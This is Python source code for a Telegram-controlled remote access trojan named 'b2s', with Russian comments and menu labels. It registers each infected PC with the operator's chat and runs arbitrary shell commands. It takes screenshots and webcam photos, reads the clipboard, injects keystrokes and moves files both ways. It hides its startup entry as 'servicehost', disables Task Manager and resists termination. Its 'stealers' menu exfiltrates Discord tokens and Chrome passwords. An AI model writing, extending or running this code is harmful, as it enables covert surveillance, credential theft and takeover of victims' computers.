# -*- coding: utf-8 -*-

import os
import tempfile
import subprocess
import socket
import uuid
import platform
from requests import get
import json
import urllib.request as ur
import cv2 as cv
import getpass
import random
import ctypes
import Discord
import ctypes, sys


internet = False
while not internet:
    try:
        subprocess.check_call(["ping", "www.google.ru", "-n", "1"])
        print("Internet is up!")
        internet = True
    except subprocess.CalledProcessError:
        exit()

os.system("pip install --upgrade pip")
os.system("pip install pytelegrambotapi")
os.system("pip install Pillow")
os.system("pip install opencv-python")
os.system("pip install pywin32")
os.system("pip3 install pycryptodome")
os.system("pip3 install pypiwin32")
os.system("pip install rotate-screen")
os.system("cls")
print("Modules loaded!")

import telebot
import win32clipboard
import ChromePassword
import rotatescreen









#Настройки

#Токен Бота
token = ''
#ChatId
chatid = 
#Проверка на chatid (True или False)
chatid_check = True
#Запускать от имени администратора (Запускает сразу в скрытом режиме)
startasadmin = False















def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if startasadmin == True:
    if is_admin():
        print("Runned as Admin")
        pass
    else:
        print("Runned as User")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        os._exit(0)
elif startasadmin == False:
    print("Runned as User")

def enableProtection():
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
def disableProtection():
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0







hostname=socket.gethostname() 
IPAddr=socket.gethostbyname(hostname) 
USER_NAME = getpass.getuser()
h = ctypes.windll.user32.FindWindowA(b'Shell_TrayWnd', None)

def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "servicehost" + str(random.randint(11111111,99999999)) + ".bat", "w+") as bat_file:
        bat_file.write(r'start "" "%s"' % file_path)



def enable_task_manager():
    os.system('reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v DisableTaskMgr /t REG_DWORD /d 0')
def disable_task_manager():
    os.system('reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v DisableTaskMgr /t REG_DWORD /d 1')




bot = telebot.TeleBot(token)

bot.send_message(chatid, 'Новый пользователь! \n\n 🟢 ' + str(hostname))

@bot.message_handler(commands=["start"])
def start(m, res=False):
    if chatid_check == True and m.chat.id == chatid:
        pass
    elif chatid_check == True and m.chat.id != chatid:
        print("Some user trying to use this bot when chatid_check is True. ChatId: " + str(m.chat.id) + ' UserName: @' + m.from_user.username)
        return
    elif chatid_check == False:
        pass
    print("New message: " + m.text + ' ChatId: ' + str(m.chat.id) + ' UserName: @' + m.from_user.username)
    keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    buttons = ["💻 Основное", "⌨️ Клавиатура", "🚧 Процессы", "🎉 Веселье", "🔑 Стиллеры"]
    keyboard.add(*buttons)
    bot.send_message(m.chat.id, 'b2s - программа удаленного доступа.', reply_markup=keyboard)

@bot.message_handler(content_types=["text"])
def handle_text(message):
    if chatid_check == True and message.chat.id == chatid:
        pass
    elif chatid_check == True and message.chat.id != chatid:
        print("Some user trying to use this bot when chatid_check is True. ChatId: " + str(message.chat.id) + ' UserName: @' + message.from_user.username)
        return
    elif chatid_check == False:
        pass
    print("New message: " + message.text + ' ChatId: ' + str(message.chat.id) + ' UserName: @' + message.from_user.username)
    if message.text == '📸 Сделать скриншот':
        bot.send_message(message.chat.id, 'Загрузка скриншота...')
        print("Uploading screenshot...")
        from PIL import ImageGrab
        snapshot = ImageGrab.grab()
        save_path = tempfile.gettempdir() + "\scr.jpg"
        snapshot.save(save_path)
        bot.send_photo(message.chat.id, photo=open(tempfile.gettempdir() + "\scr.jpg", 'rb'))
        os.remove(tempfile.gettempdir() + "\scr.jpg")
        print("Screenshot sended!")
    if message.text == '💬 Отправить сообщение':
        msg = bot.send_message(message.chat.id, 'Введи текст для MessageBox:')
        bot.register_next_step_handler(msg, sendmessageboxstage)
    if message.text == '🤖 Отправить команду':
        msg = bot.send_message(message.chat.id, 'Введи команду для исполнения:')
        bot.register_next_step_handler(msg, sendcmdcommand)
    if message.text == '👁️ Получить информацию о ПК':
        url = 'http://ipinfo.io/json'
        response = ur.urlopen(url)
        data = json.load(response)
        org=data['org']
        city = data['city']
        country=data['country']
        region=data['region']
        bot.send_message(message.chat.id, 'Информация о ПК: \n\nАйпи адрес: ' + get('https://api.ipify.org').text + '\nИмя ПК: ' + hostname + "\nИмя Пользователя: " + USER_NAME + '\nМак-Адрес: ' + ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1]) + '\nОС: ' + platform.system() + ' ' + platform.release() + '\nСтрана: ' + country + '\nГород: ' + city + '\nРегион: ' + region + '\nПровайдер: ' + org)
    if message.text == '📄 Получить список процессов':
        r = str(subprocess.getoutput('{}'.format('tasklist')))
        if len(r) > 4095:
            for x in range(0, len(r), 4095):
                bot.send_message(message.chat.id, '{}'.format(r[x:x + 4095]))
                print(x)
            else:
                bot.send_message(message.chat.id, '{}'.format(r))
    if message.text == '📷 Получить изображение с камеры':
        cam_port = 0
        cam = cv.VideoCapture(cam_port)
        result, image = cam.read()
        if result:
            cv.imshow("b2s", image)
            cv.imwrite(tempfile.gettempdir() + "\scrwebcam.jpg", image)
            cv.destroyWindow("b2s")
            bot.send_photo(message.chat.id, photo=open(tempfile.gettempdir() + "\scrwebcam.jpg", 'rb'))
            os.remove(tempfile.gettempdir() + "\scrwebcam.jpg")
        else:
            bot.send_message(message.chat.id, "Камера не найдена.")
    if message.text == '🔄 Назад':
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        buttons = ["💻 Основное", "⌨️ Клавиатура", "🚧 Процессы", "🎉 Веселье", "🔑 Стиллеры"]
        keyboard.add(*buttons)
        bot.send_message(message.chat.id, 'b2s - программа удаленного доступа.', reply_markup=keyboard)
    if message.text == '🛑 Выключить ПК':
        bot.send_message(message.chat.id, 'Выключаем...')
        os.system("shutdown /s /f /t 0")
    if message.text == '🔄 Перезапустить ПК':
        bot.send_message(message.chat.id, 'Перезапускаем...')
        os.system("shutdown /r /f /t 0")
    if message.text == '🚪 Выйти из пользователя':
        bot.send_message(message.chat.id, 'Выходим...')
        os.system("shutdown /l")
    if message.text == '☠️ Вызвать BSoD':
        bot.send_message(message.chat.id, 'Вызываем BSoD...')
        os.system("start "" servicehost.exe")
    if message.text == '▶️ Добавить в АвтоЗагрузку':
        bot.send_message(message.chat.id, 'Добавляем в автозагрузку...')
        add_to_startup(os.path.realpath(__file__))
        bot.send_message(message.chat.id, 'Успешно добавлено в автозагрузку.')
    if message.text == '📄 Скопировать текст':
        msg = bot.send_message(message.chat.id, 'Введи текст:')
        bot.register_next_step_handler(msg, copytext)
    if message.text == '📄 Убить Процесс':
        msg = bot.send_message(message.chat.id, 'Введи название процесса:')
        bot.register_next_step_handler(msg, taskkillprocces)
    if message.text == '📄 Открыть Процесс':
        msg = bot.send_message(message.chat.id, 'Введи путь к программе:')
        bot.register_next_step_handler(msg, openprocess)
    if message.text == '🥵 Нагрузить процессор':
        os.system('start "" "cpuload.py"')
    if message.text == '🗣 Произнести сообщение':
        msg = bot.send_message(message.chat.id, 'Введи сообщение (желательно на английском языке):')
        bot.register_next_step_handler(msg, sendmessagespeakstage)
    if message.text == '🔗 Открыть URL':
        msg = bot.send_message(message.chat.id, 'Введи ссылку:')
        bot.register_next_step_handler(msg, openurl)
    if message.text == '📜 Сменить обои':
        msg = bot.send_message(message.chat.id, 'Введи путь к обоям:')
        bot.register_next_step_handler(msg, changewallpaper)
    if message.text == '💿 Открыть CD Rom':
        bot.send_message(message.chat.id, 'CD Rom открыт!')
        os.system("taskkill /f /im wscript.exe > nul")
        try:
            os.remove(tempfile.gettempdir() + '\zebra.vbs')
        except FileNotFoundError:
            print("File VBS are not created.")
        file_name = tempfile.gettempdir() + '\zebra.vbs'
        f = open(file_name, 'a+')
        f.write('CreateObject("WMPlayer.OCX.7").cdromCollection.Item(i).Eject')
        f.close()
        os.system(tempfile.gettempdir() + '\zebra.vbs')
        if "wscript.exe" in os.popen('wmic process get description').read():
            os.remove(tempfile.gettempdir() + '\zebra.vbs')
        print("CDROM ejected!")
    if message.text == '👎🏿 Скрыть TaskBar':
        bot.send_message(message.chat.id, 'TaskBar скрыт')
        ctypes.windll.user32.ShowWindow(h, 0)
    if message.text == '👍🏿 Показать TaskBar':
        bot.send_message(message.chat.id, 'TaskBar показан')
        ctypes.windll.user32.ShowWindow(h, 9)
    if message.text == '📁 Убить explorer':
        bot.send_message(message.chat.id, 'Explorer скрыт')
        os.system("taskkill /f /im explorer.exe")
    if message.text == '📁 Вернуть explorer':
        bot.send_message(message.chat.id, 'Explorer показан')
        os.system("explorer")
    if message.text == '🖥️ Выключить Диспетчер Задач':
        bot.send_message(message.chat.id, 'Диспетчер Задач выключен.')
        disable_task_manager()
    if message.text == '🖥️ Включить Диспетчер Задач':
        bot.send_message(message.chat.id, 'Диспетчер Задач включен.')
        enable_task_manager()
    if message.text == '🔑 Получить токен Дискорда':
        bot.send_message(message.chat.id, 'Токен Дискорда: ' + Discord.DiscordToken())
    if message.text == '🔑 Получить пароли Chrome':
        r = ChromePassword.main()
        file_name = tempfile.gettempdir() + "\pwd_b2s.txt"
        f = open(file_name, 'a+')  # open file in append mode
        f.write(r)
        f.close()
        bot.send_document(chat_id=message.chat.id, document=open(tempfile.gettempdir() + "\pwd_b2s.txt", 'rb'))
        os.remove(tempfile.gettempdir() + "\pwd_b2s.txt")
    if message.text == "🔊 Воиспроизвести звук":
        msg = bot.send_message(message.chat.id, 'Введи путь к файлу:')
        bot.register_next_step_handler(msg, playsound)
    if message.text == "📁 Загрузить файл":
        msg = bot.send_message(message.chat.id, 'Отправь сюда файл:')
        bot.register_next_step_handler(msg, uploadfile)
    if message.text == "📁 Удалить файл":
        msg = bot.send_message(message.chat.id, 'Введи путь к файлу:')
        bot.register_next_step_handler(msg, removefile)
    if message.text == '📄 Нажать клавишу':
        msg = bot.send_message(message.chat.id, 'Введи клавишу (Возможные клавиши: https://ss64.com/vb/sendkeys.html , а также можно писать слова):')
        bot.register_next_step_handler(msg, sendkey)
    if message.text == '🔁 Повернуть экран (Пейзаж)':
        bot.send_message(message.chat.id, 'Экран повернут.')
        screen = rotatescreen.get_primary_display()
        screen.set_landscape()
    if message.text == '🔁 Повернуть экран (Пейзаж Перевернутый)':
        bot.send_message(message.chat.id, 'Экран повернут.')
        screen = rotatescreen.get_primary_display()
        screen.set_landscape_flipped()
    if message.text == '📄 Получить текст из Буфера':
        win32clipboard.OpenClipboard()
        buffercopied_text = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        bot.send_message(message.chat.id, 'Текущий скопированный текст: ' + str(buffercopied_text))
    if message.text == '📁 Скачать файл':
        msg = bot.send_message(message.chat.id, 'Введи путь к файлу:')
        bot.register_next_step_handler(msg, downloadfile)
    if message.text == '🔒 Включить защиту от снятия процесса':
        if startasadmin == True:
            enableProtection()
            bot.send_message(message.chat.id, 'Включена защита!')
        elif startasadmin == False:
            bot.send_message(message.chat.id, 'Для этого нужны права администратора!')
    if message.text == '🔓 Выключить защиту от снятия процесса':
        if startasadmin == True:
            disableProtection()
            bot.send_message(message.chat.id, 'Выключена защита!')
        elif startasadmin == False:
            bot.send_message(message.chat.id, 'Для этого нужны права администратора!')



    if message.text == '💻 Основное':
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        buttons = ["📸 Сделать скриншот", "🤖 Отправить команду", "👁️ Получить информацию о ПК", "📷 Получить изображение с камеры", "🛑 Выключить ПК", "🔄 Перезапустить ПК", "🚪 Выйти из пользователя", "☠️ Вызвать BSoD", "▶️ Добавить в АвтоЗагрузку", "🖥️ Выключить Диспетчер Задач", "🖥️ Включить Диспетчер Задач", "📁 Загрузить файл", "📁 Скачать файл", "📁 Удалить файл", "🔄 Назад"]
        keyboard.add(*buttons)
        bot.send_message(message.chat.id, 'Основное меню', reply_markup=keyboard)
    if message.text == '⌨️ Клавиатура':
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        buttons = ["📄 Скопировать текст", "📄 Получить текст из Буфера", "📄 Нажать клавишу", "🔄 Назад"]
        keyboard.add(*buttons)
        bot.send_message(message.chat.id, 'Клавиатурное меню', reply_markup=keyboard)
    if message.text == '🚧 Процессы':
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        buttons = ["📄 Получить список процессов", "📄 Убить Процесс", "📄 Открыть Процесс", "🥵 Нагрузить процессор", "🔒 Включить защиту от снятия процесса", "🔓 Выключить защиту от снятия процесса", "🔄 Назад"]
        keyboard.add(*buttons)
        bot.send_message(message.chat.id, 'Процессовое меню', reply_markup=keyboard)
    if message.text == '🎉 Веселье':
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        buttons = ["💬 Отправить сообщение", "🗣 Произнести сообщение", "🔊 Воиспроизвести звук", "🔗 Открыть URL", "📜 Сменить обои", "💿 Открыть CD Rom", "👎🏿 Скрыть TaskBar", "👍🏿 Показать TaskBar", "📁 Убить explorer", "📁 Вернуть explorer", "🔁 Повернуть экран (Пейзаж)", "🔁 Повернуть экран (Пейзаж Перевернутый)", "🔄 Назад"]
        keyboard.add(*buttons)
        bot.send_message(message.chat.id, 'Веселое меню :)', reply_markup=keyboard)
    if message.text == '🔑 Стиллеры':
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        buttons = ["🔑 Получить токен Дискорда", "🔑 Получить пароли Chrome", "🔄 Назад"]
        keyboard.add(*buttons)
        bot.send_message(message.chat.id, 'Меню со стиллерами', reply_markup=keyboard)


def sendmessageboxstage(message):
    bot.send_message(message.chat.id, 'Отправлено сообщение: {}'.format(message.text))
    os.system("taskkill /f /im wscript.exe > nul")
    try:
        os.remove(tempfile.gettempdir() + '\zebra.vbs')
    except FileNotFoundError:
        print("File VBS are not created.")
    file_name = tempfile.gettempdir() + '\zebra.vbs'
    f = open(file_name, 'a+')
    f.write('MsgBox "' + '{}'.format(message.text) +'", vbSystemModal')
    f.close()
    os.system(tempfile.gettempdir() + '\zebra.vbs')
    if "wscript.exe" in os.popen('wmic process get description').read():
        os.remove(tempfile.gettempdir() + '\zebra.vbs')
    print("MessageBox sended!")
def sendcmdcommand(message):
    os.system('{}'.format(message.text))
    bot.send_message(message.chat.id, 'Исполнена команда: {}'.format(message.text) + '\n\nЛоги команды: ' + '*' + str(subprocess.getoutput('{}'.format(message.text)) + '*'), parse_mode='Markdown')

def copytext(message):
    win32clipboard.OpenClipboard()
    win32clipboard.EmptyClipboard()
    win32clipboard.SetClipboardText('{}'.format(message.text))
    win32clipboard.CloseClipboard()
    print("Copied text: " + '{}'.format(message.text))
    bot.send_message(message.chat.id, 'Скопирован текст: {}'.format(message.text))

def taskkillprocces(message):
    os.system("taskkill /f /im " + '{}'.format(message.text))
    bot.send_message(message.chat.id, 'Процесс {}'.format(message.text) + ' снят!')
def openprocess(message):
    os.system('start "" "' + '{}'.format(message.text) + '"')
    bot.send_message(message.chat.id, 'Процесс {}'.format(message.text) + ' запущен!')
def sendmessagespeakstage(message):
    bot.send_message(message.chat.id, 'Отправлено сообщение: {}'.format(message.text))
    os.system("taskkill /f /im wscript.exe > nul")
    try:
        os.remove(tempfile.gettempdir() + '\zebra.vbs')
    except FileNotFoundError:
        print("File VBS are not created.")
    file_name = tempfile.gettempdir() + '\zebra.vbs'
    f = open(file_name, 'a+')
    f.write('CreateObject("SAPI.SpVoice").Speak"' + '{}'.format(message.text) + '"')
    f.close()
    os.system(tempfile.gettempdir() + '\zebra.vbs')
    if "wscript.exe" in os.popen('wmic process get description').read():
        os.remove(tempfile.gettempdir() + '\zebra.vbs')
    print("TTS sended!")
def openurl(message):
    os.system('start "" "' + '{}'.format(message.text) + '"')
    bot.send_message(message.chat.id, 'Ссылка {}'.format(message.text) + ' открыта!')
def changewallpaper(message):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, '{}'.format(message.text) , 0)
    bot.send_message(message.chat.id, 'Обои установлены')

def playsound(message):
    bot.send_message(message.chat.id, 'Проигран файл: {}'.format(message.text))
    os.system("taskkill /f /im wscript.exe > nul")
    try:
        os.remove(tempfile.gettempdir() + '\zebra.vbs')
    except FileNotFoundError:
        print("File VBS are not created.")
    file_name = tempfile.gettempdir() + '\zebra.vbs'
    f = open(file_name, 'a+')
    f.write('Set WMP = WScript.CreateObject("MediaPlayer.MediaPlayer","WMP_")\n')
    f.write('WMP.Open "' + '{}'.format(message.text) + '"\n')
    f.write('WMP.Play\n')
    f.write('WScript.Sleep 7000')
    f.close()
    os.system(tempfile.gettempdir() + '\zebra.vbs')
    if "wscript.exe" in os.popen('wmic process get description').read():
        os.remove(tempfile.gettempdir() + '\zebra.vbs')
    print("Sound played!")
def uploadfile(message):
    file_info = bot.get_file('{}'.format(message.document.file_id))
    downloaded_file = bot.download_file(file_info.file_path)
    originalfile_name = '{}'.format(message.document.file_name)
    with open(tempfile.gettempdir() + '\\' + originalfile_name, 'wb') as new_file:
        new_file.write(downloaded_file)
    bot.send_message(message.chat.id, 'Файл ' + originalfile_name + ' сохранен по пути: ' + tempfile.gettempdir() + '\\' + originalfile_name)
def removefile(message):
    os.remove('{}'.format(message.text))
    bot.send_message(message.chat.id, 'Файл ' + '{}'.format(message.text) + ' удален!')
def sendkey(message):
    bot.send_message(message.chat.id, 'Нажата клавиша: {}'.format(message.text))
    os.system("taskkill /f /im wscript.exe > nul")
    try:
        os.remove(tempfile.gettempdir() + '\zebra.vbs')
    except FileNotFoundError:
        print("File VBS are not created.")
    file_name = tempfile.gettempdir() + '\zebra.vbs'
    f = open(file_name, 'a+')
    f.write('Set WshShell = WScript.CreateObject("WScript.Shell")\nWshShell.SendKeys "' + '{}'.format(message.text) + '"')
    f.close()
    os.system(tempfile.gettempdir() + '\zebra.vbs')
    if "wscript.exe" in os.popen('wmic process get description').read():
        os.remove(tempfile.gettempdir() + '\zebra.vbs')
    print("Key Pressed!")
def downloadfile(message):
    bot.send_document(chat_id=message.chat.id, document=open('{}'.format(message.text), 'rb'))
    print("File Downloaded!")



try:
    bot.polling(none_stop=True, interval=0)
except SystemExit:
    print("Trying to exit!!")





